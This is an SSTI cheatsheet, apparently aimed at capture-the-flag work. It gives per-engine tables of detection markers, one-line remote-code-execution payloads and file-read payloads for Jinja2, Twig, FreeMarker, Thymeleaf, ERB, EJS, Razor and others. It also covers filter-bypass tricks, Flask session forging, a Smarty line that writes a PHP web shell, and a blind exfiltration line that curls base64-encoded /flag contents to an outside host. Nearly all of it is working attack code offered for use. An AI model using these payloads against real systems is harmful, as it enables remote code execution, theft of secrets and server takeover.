# SSTI cheatsheet — the quick-reference tables

---

## Engine → marker → discriminator

| Engine | Marker | Discriminator |
|---|---|---|
| Jinja2 | `{{7*7}}`=49 | `{{7*'7'}}`=**7777777** |
| Twig | `{{7*7}}`=49 | `{{7*'7'}}`=49; `{#x#}` comment |
| Nunjucks | `{{7*7}}`=49 | `{{7*'7'}}`=49; JS-side |
| FreeMarker | `${7*7}`=49 | `${.version}` leaks version |
| Mako | `${7*7}`=49 | `${__import__}` works |
| Velocity | `#set($x=7*7)${x}`=49 | `$x.class`/`#include` |
| Thymeleaf | `*{7*7}`/`#{7*7}`=49 | `__${x}__` preprocessing |
| OGNL | `%{7*7}`=49 | `@Class@static` |
| Smarty | `{7*7}`=49 | `{$smarty.version}` |
| ERB | `<%=7*7%>`=49 | `<%= `id` %>` RCEs |
| EJS | `<%=7*7%>`=49 | `<%= process %>` |
| Pug | `#{7*7}`=49 | `#{global}` |
| Handlebars | `{{this}}` context | `{{#with}}` blocks |
| doT | `{{=7*7}}`=49 | `{{?}}` syntax |
| Groovy | `${7*7}`=49 | `${'id'.execute()}` |
| Pebble | `{{7*7}}`=49 | `{{'a'.getClass()}}` |
| Jinjava | `{{7*7}}`=49 | `.getClass()` java |
| Liquid | `{{7\|times:7}}`=49 | filters-only |
| Razor | `@(7*7)`=49 | `@System.` namespace |
| Tornado | `{{7*7}}`=49 | `{% import os %}` |
| Go template | `{{.}}` dump | no `7*7` — field-access only |
| Blade | (not SSTI by default) | `@php` if user-compiled |
| Mustache | `{{x}}` | NO eval — XSS only via `{{{` |

---

## Engine → one-line RCE (first working payload)

| Engine | RCE payload |
|---|---|
| Jinja2 | `{{lipsum.__globals__.os.popen('id').read()}}` |
| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Twig-alt | `{{['id']\|map('system')\|join}}` |
| FreeMarker | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Velocity | `$x.class.forName('java.lang.Runtime').getRuntime().exec('id')` |
| Thymeleaf | `*{T(java.lang.Runtime).getRuntime().exec('id')}` |
| OGNL | `%{@java.lang.Runtime@getRuntime().exec('id')}` |
| Smarty | `{php}system('id');{/php}` or `{'id'\|system}` |
| Mako | `${__import__('os').popen('id').read()}` |
| EJS | `<%= global.process.mainModule.require('child_process').execSync('id') %>` |
| Nunjucks | `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}` |
| Pug | `#{global.process.mainModule.require('child_process').execSync('id')}` |
| doT | `{{=global.process.mainModule.require('child_process').execSync('id')}}` |
| ERB | `<%= `id` %>` or `<%= system('id') %>` |
| Slim | `= `id`` |
| Groovy | `${'id'.execute()}` |
| Pebble | `{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}` |
| Jinjava | `{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}` |
| Tornado | `{% import os %}{{os.popen('id').read()}}` |
| JSP-EL | `${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}` |
| Smarty-writeFile | `{Smarty_Internal_Runtime_WriteFile::writeFile('/var/www/html/x.php','<?=system($_GET[c]);',null)}` |

---

## Engine → flag-read (no-exec file read)

| Engine | Payload |
|---|---|
| Jinja2 | `{{lipsum.__globals__.__builtins__.open('/flag').read()}}` |
| Jinja2-config | `{{config}}` / `{{config['FLAG']}}` |
| Twig | `{{source('/flag')}}` / `{{include('/flag')}}` / `{{constant('FLAG')}}` |
| FreeMarker | `<#include '/flag'>` (error-leak) |
| Velocity | `#include('/flag')` |
| Mako | `${open('/flag').read()}` |
| EJS | `<%=require('fs').readFileSync('/flag','utf8')%>` |
| Node-any | `process.mainModule.require('fs').readFileSync('/flag','utf8')` |
| ERB | `<%=File.read('/flag')%>` / `<%=ENV%>` |
| Smarty | `{include file='/flag'}` / `{$smarty.const.FLAG}` |
| Groovy | `${new File('/flag').text}` |
| Thymeleaf | `*{new String(T(Files).readAllBytes(T(Paths).get('/flag')))}` |
| Liquid | `{{user.password}}` field-leak only |
| Go tmpl | `{{.Flag}}` bound field only |
| Blade | `{{env('FLAG')}}` |

---

## The universal flow

```text
1. {{7*7}} ${7*7} <%=7*7%> #{7*7} *{7*7} — find the syntax family
2. {{7*'7'}} — 7777777=jinja, 49=twig/nunjucks
3. {{nonexistent.x}} — the error names the engine
4. dump context: {{config}} {{_context}} {{self}} ${context} etc.
5. file-read primitive for the engine
6. RCE chain for the engine
7. OOB if blind (timing first, then curl/wget/nslookup)
```

---

## Anti-filter quick-table — `__`/quotes/keywords

```jinja2
{{''|attr('__class__')}}                       -- attr filter
{{''|attr('\x5f\x5fclass\x5f\x5f')}}            -- hex in string
{{''[dict(__class__=x)|list|first]}}            -- dict-keys → string
{{''|attr(request.args.a)}}&a=__class__          -- param-carried
{{''.__clclassass__}}                             -- double-write
{{'%c'|format(95)}}{{'%c'|format(95)}}            -- char build
{{lipsum|string|list}}                            -- lipsum chars
{{url_for|string|list}}                           -- func-repr chars
{{request.args.f(request.args.a)}}&f=eval&a=...   -- param-carried calls
{%if x%}...{%endif%}                              -- when {{}} filtered
{%print(x)%}
```


---

## Per-engine one-page — Jinja2/Flask

```jinja2
detect:    {{7*7}}→49 {{7*'7'}}→7777777 {{'a'+'b'}}→ab
enum:      {{config}} {{_context}} {{_context|keys}} {{self}} {{request}}
exec:      {{lipsum.__globals__.os.popen('CMD').read()}}
           {{cycler.__init__.__globals__.os.popen('CMD').read()}}
           {{self.__init__.__globals__.os.popen('CMD').read()}}
           {{''.__class__.__mro__[1].__subclasses__()[N]('CMD',shell=True,stdout=-1).communicate()}}
read:      {{lipsum.__globals__.__builtins__.open('/flag').read()}}
           {{config.from_pyfile('/flag')}}
           {{lipsum.__globals__.os.popen('cat /flag').read()}}
env:       {{lipsum.__globals__.os.environ}}
           {{request.environ}}
forge:     {{config.SECRET_KEY}} → session_dissect → flask-session-cookie
bypass:    ''|attr('__class__')  dict(__x__=v)|first  request.args.c
blind:     os.system('cp /flag /app/static/x') → GET /static/x
           os.popen('curl me/?d=$(cat /flag|base64)').read()
```

## Per-engine one-page — Twig/Symfony

```twig
detect:    {{7*7}}→49 {{7*'7'}}→49/error {{'a'+'b'}}→0 {{'a'~'b'}}→ab
enum:      {{_context}} {{_context|keys}} {{app}} {{_self}} {{app.request.server}}
exec v1:   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
exec v2:   {{['id']|map('system')}}  {{['cat /flag']|map('system')}}
           {{['id']|map('exec')}}  {{['id']|map('passthru')}}
           {{['id']|filter('system')}}
read:      {{include('/flag')}} {{source('/flag')}}
           {{['/flag']|map('file_get_contents')}}
env:       {{app.request.server.get('FLAG')}} {{getenv('FLAG')}}
ctx:       {{app.request}} {{app.user}} {{app.session}} {{app.flashes}}
bypass:    ['i'~'d']|map('sys'~'tem')  [app.request.query.c]|map('system')
```

## Per-engine one-page — FreeMarker

```ftl
detect:    ${7*7}→49 ${x!''}-silences ${.version}→renders
enum:      ${.data_model} ${.data_model?keys} ${.env} ${.main}
exec:      ${"freemarker.template.utility.Execute"?new()("id")}
           ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
read:      <#include "/flag"> <#import "/flag" as x>
api:       ${x?api.getClass().forName('java.lang.Runtime')...}
env:       ${x?api.getClass().forName('java.lang.System').getenv()}
bypass:    [#ftl] square-syntax  ?api gated→?new  ?new gated→beans
```

## Per-engine one-page — Velocity

```velocity
detect:    $x silent-fail  #set($x=7*7)$x→49  $x.class→renders?
enum:      $context $context.keys $request $session $application
exec:      $x.class.forName('java.lang.Runtime').getRuntime().exec('id')
           $class.inspect('java.lang.Runtime').type.getRuntime().exec('id')
read:      #include('/flag') #parse('/flag')
           $x.class.forName('java.util.Scanner')...chain
env:       $x.class.forName('java.lang.System').getenv()
bypass:    $class/$render tools when .class gated
           $render.eval($ctx,"VTL-code") — nested eval
           classLoader.loadClass when forName gated
```

## Per-engine one-page — Thymeleaf/SpEL

```java
detect:    *{7*7}→49 in-attr  __${7*7}__→49 preprocessing
           #{x}→msg-resolution  ${x}→var
enum:      *{beans} *{ctx} *{ctx.vars} *{param} *{session} *{application}
exec:      *{T(java.lang.Runtime).getRuntime().exec('id')}
           __${T(java.lang.Runtime).getRuntime().exec('id')}__::x
           *{new java.lang.ProcessBuilder('id').start()}
read:      *{new java.util.Scanner(new java.io.File('/flag')).next()}
           *{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))}
env:       *{T(java.lang.System).getenv('FLAG')}
           *{beans.environment.getProperty('flag')}
bypass:    __${}__ preprocessing when direct-attr gated
           #ctx.vars → objects → .class chains
```

## Per-engine one-page — ERB/Rails

```ruby
detect:    <%=7*7%>→49  <%=7*'7'%>→7777777  <%='a'.upcase%>→A
enum:      <%=self%> <%=ENV%> <%=params%> <%=request%> <%=session%>
           <%=@x%> instance-vars  <%=self.methods.grep(/file|read/)%>
exec:      <%=`id`%>  <%=%x(cat /flag)%>  <%=IO.popen('id').read%>
           <%=spawn('id')%>  <%=exec('id')%>  <%=system('id')%>
read:      <%=File.read('/flag')%>  <%=IO.read('/flag')%>
           <%=raise File.read('/flag')%>  — error-channel!
env:       <%=ENV['FLAG']%>  <%=ENV.to_h%>
rails:     <%=Rails.application.secrets%>  <%=Rails.root%>
bypass:    raise-exfil when output suppressed
           <%code%> statements — multiline bodies
```

## Per-engine one-page — EJS/Node

```javascript
detect:    <%=7*7%>→49  <%=NaN%>→NaN  <%=undefined%>→undefined
           <%='a'.toUpperCase()%>→A
enum:      <%=global%> <%=process%> <%=process.env%> <%=locals%>
           <%=this%> <%=module%> <%=__dirname%>
exec:      <%=global.process.mainModule.require('child_process').execSync('id').toString()%>
           <% x=global.process.mainModule.require('child_process') %><%=x.execSync('id').toString()%>
read:      <%=global.process.mainModule.require('fs').readFileSync('/flag','utf8')%>
           <%- include('/flag') %>  — template-include
env:       <%=process.env.FLAG%>  <%=global.process.env.FLAG%>
bypass:    .constructor chains  module.constructor._load
           <%- raw output — entity-enc differs
```

## Per-engine one-page — Nunjucks

```javascript
detect:    {{7*7}}→49  {{7*'7'}}→7777777  {{'a'.toUpperCase()}}→A
           (vs jinja: .upper() fails, .toUpperCase() works)
enum:      {{range}} {{cycler}} {{joiner}} {{ctx}} {{locals}}
exec:      {{range.constructor('return process')()}}
           {{''.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}
read:      {{range.constructor('return process.mainModule.require("fs").readFileSync("/flag","utf8")')()}}
env:       {{range.constructor('return process.env')()}}
           {{range.constructor('return process.env.FLAG')()}}
bypass:    .constructor.constructor → Function — universal JS
           cycler/joiner/namespace same chain
```

## Per-engine one-page — Smarty

```smarty
detect:    {$x} works {7*7}? → test {$x=7*7}  {php}1{/php}→1?
enum:      {$smarty} {$smarty.const} {$smarty.server} {$smarty.get}
exec:      {php}system('id');{/php}  — needs security-off
           {if system('id')}{/if}   — the eval-always-works
           {math equation="(system('id'))"} — pre-3.1.30
read:      {php}echo file_get_contents('/flag');{/php}
           {if print(file_get_contents('/flag'))}{/if}
           {include file='/flag'}
env:       {$smarty.server.FLAG} {$smarty.env.FLAG} {$smarty.const.FLAG}
mods:      {'/flag'|file_get_contents} {'id'|system} {'id'|exec}
```

## Per-engine one-page — Mako

```python
detect:    ${7*7}→49  ${7*'7'}→7777777  ${'a'.upper()}→A
enum:      ${context} ${context.keys()} ${self} ${self.module}
exec:      ${__import__('os').popen('id').read()}
           <% import os %>${os.popen('id').read()}
           <%! import os %>  — module-level
read:      ${open('/flag').read()}
           ${__import__('io').open('/flag').read()}
env:       ${__import__('os').environ}
           ${__import__('os').environ['FLAG']}
bypass:    <% code %> statements — full python bodies
           <%! def %> module-level — define fns
```

## Per-engine one-page — Tornado

```python
detect:    {{7*7}}→49  {{7*'7'}}→7777777  {{'a'.upper()}}→A
enum:      {{handler}} {{this}} {{_tt_modules}} {{kwargs}}
exec:      {% import os %}{{os.popen('id').read()}}
           {% import subprocess %}{{subprocess.check_output('id',shell=True)}}
read:      {% import builtins %}{{builtins.open('/flag').read()}}
           {% from builtins import open %}{{open('/flag').read()}}
env:       {% import os %}{{os.environ}}
           {% import os %}{{os.environ['FLAG']}}
app:       {{handler.application.settings}} {{handler.application.settings['flag']}}
```

## Per-engine one-page — Groovy

```groovy
detect:    ${7*7}→49  ${'a'.execute()}→process  ${new File('/x')}
enum:      ${this} ${this.class} ${System.getenv()} ${System.properties}
exec:      ${'id'.execute().text}  ${'cat /flag'.execute().text}
           ${Runtime.getRuntime().exec('id')}
           ${['sh','-c','cat /flag'].execute().text}
read:      ${new File('/flag').text}  ${new File('/flag').readLines()}
           ${new String(Files.readAllBytes(Paths.get('/flag')))}
env:       ${System.getenv('FLAG')}  ${System.getenv()}
meta:      ${Eval.me("'id'.execute().text")}  ${new GroovyShell().evaluate("...")}
```

## Per-engine one-page — Django

```django
detect:    {{7*7}}→literal  {%now 'Y'%}→renders  {{x.y}}→walks
enum:      {{settings}} {{request.META}} {{obj.__dict__}}
           {{user.password}} {{perms}} {{messages}}
exec:      NONE — no eval — read-leak only
read:      {% include 'path' %} — loader-bounded
           {% include '../x' %} — traversal
           {{settings|pprint}} — the full-dump filter
env:       {{request.META}} — environ via META
auto-call: {{obj.method}} — zero-arg methods RUN on lookup!
           {{obj.dangerous}} — side-effect risk
debug:     {% debug %} — context-dump if bound
```

## Per-engine one-page — Liquid

```liquid
detect:    {{7*7}}→literal  {{7|times:7}}→49  {{7|plus:7}}→14
enum:      {{site}} {{site.config}} {{site.data}} {{page}} {{settings}}
           {{shop}} {{product}} {{customer}} {{forloop}}
exec:      NONE by design — context-objects only
read:      {% include 'x' %} — _includes bound
           {{site.static_files}} — file-inventory
           {{site.config}} — _config.yml — secrets in config!
filters:   {{x|upcase}} {{x|where}} {{x|map}} {{x|json}}
ctx:       {{site.posts}} {{site.pages}} {{site.collections}}
```

## Per-engine one-page — Handlebars

```handlebars
detect:    {{7*7}}→literal  {{x}}→works  {{lookup this 'x'}}→walks
enum:      {{this}} {{@root}} {{@root.secret}} {{@index}} {{@key}}
exec:      {{#with (lookup this 'constructor')}}
           {{#with (lookup this 'constructor')}}
           {{this 'return process.env.FLAG'}}{{/with}}{{/with}}
           — Function-ctor via nested-with
read:      constructor-chain → require → fs
env:       constructor-chain → process.env
helpers:   {{myhelper 'x'}} — app-registered fns — the real surface
           {{exec 'id'}} {{shell 'id'}} {{renderFile '/flag'}}
proto:     {{this.constructor}} → version-gated — protoAccessControl
```

## Per-engine one-page — Razor/.NET

```csharp
detect:    @7*7→49  @(7*7)→49  @{var x=1;}
enum:      @this @this.GetType() @Context @ViewBag @ViewData @Model
exec:      @System.Diagnostics.Process.Start("cmd","/c id")
           @{System.Diagnostics.Process.Start("/bin/sh","-c 'cat /flag'");}
read:      @System.IO.File.ReadAllText("/flag")
           @System.IO.File.ReadAllLines("/flag")
           @System.IO.Directory.GetFiles("/")
env:       @System.Environment.GetEnvironmentVariable("FLAG")
           @System.Environment.GetEnvironmentVariables()
ctx:       @ViewBag.flag @ViewData["flag"] @TempData["flag"] @Model.flag
multi:     @functions{string F(){return File.ReadAllText("/flag");}} @F()
inject:    @inject IConfiguration C → @C["FLAG"]
```

## Per-engine one-page — ColdFusion

```cfml
detect:    #7*7#→49  #x.y#→walks
enum:      #SERVER# #CGI# #SESSION# #APPLICATION# #COOKIE#
exec:      <cfexecute name="/bin/sh" arguments="-c 'cat /flag'" variable="y">#y#
           #CreateObject('java','java.lang.Runtime').getRuntime().exec('id')#
read:      #FileRead('/flag')#  <cffile action="read" file="/flag" variable="x">#x#
env:       #CreateObject('java','java.lang.System').getenv()#
           #SERVER.os#
ctx:       <cfdump var="#application#">  <cfdump var="#SERVER#">
```

## Per-engine one-page — Play/Scala

```scala
detect:    @(7*7)→49  @{7*7}→49
enum:      @request @session @flash @config @env @context
exec:      @Runtime.getRuntime().exec("id")
           @{val p=Runtime.getRuntime().exec("cat /flag");}
read:      @scala.io.Source.fromFile("/flag").mkString
           @new java.util.Scanner(new java.io.File("/flag")).next()
env:       @System.getenv("FLAG")  @env.getProperty("flag")
import:    @import scala.io.Source → @Source.fromFile("/flag").mkString
           @import java.lang.Runtime → @Runtime.getRuntime()...
```

## The "which-file" decision — one-line map

```text
{{7*7}}→49 → str-mul? → python-family (jinja/mako/tornado)
           → num-only? → php-family (twig/volt/latte/smarty)
           → ctx-obj?  → nunjucks/handlebars (node)
${7*7}→49  → java-family (freemarker/velocity/pebble/jinjava/groovy/httl/beetl)
           → or node-marko
<%=7*7%>→49 → ejs (js) vs erb (ruby) vs jsp (java) vs asp — method-tells
#{7*7}→49  → slim (ruby) vs pug (js) vs spel/ognl (java) — sigil-tells
*{7*7}→49  → thymeleaf — only inside th: attrs
@7*7→49    → razor (.net) vs play (scala) vs rythm (java)
#7*7#→49   → coldfusion
{$x=7*7}→49 → smarty
{=7*7}→49  → latte
{{7*7}}→literal → liquid/handlebars/django/mustache — no-arith engines
                → OR not-SSTI — check format-string.md + deferred renders
```

## The sanity-check table — is it even SSTI?

```text
{{7*7}} → "49"     → evaluated → SSTI confirmed
{{7*7}} → "{{7*7}}" → literal   → probably not — check deferred
{{7*7}} → ""       → suppressed → blind-position — check renders
{{7*7}} → 500      → parsed     → SSTI — filter between you and it
{{7*7}} → "7"      → partial?   → encoding-eaten — double-encode
{x}    → resolved → format-injection — NOT template — format-string.md
${jndi:ldap://}     → the OTHER ${} — log4j-adjacent — different class
{{constructor}}     → browser-side → CSTI → web-xss not this skill
```
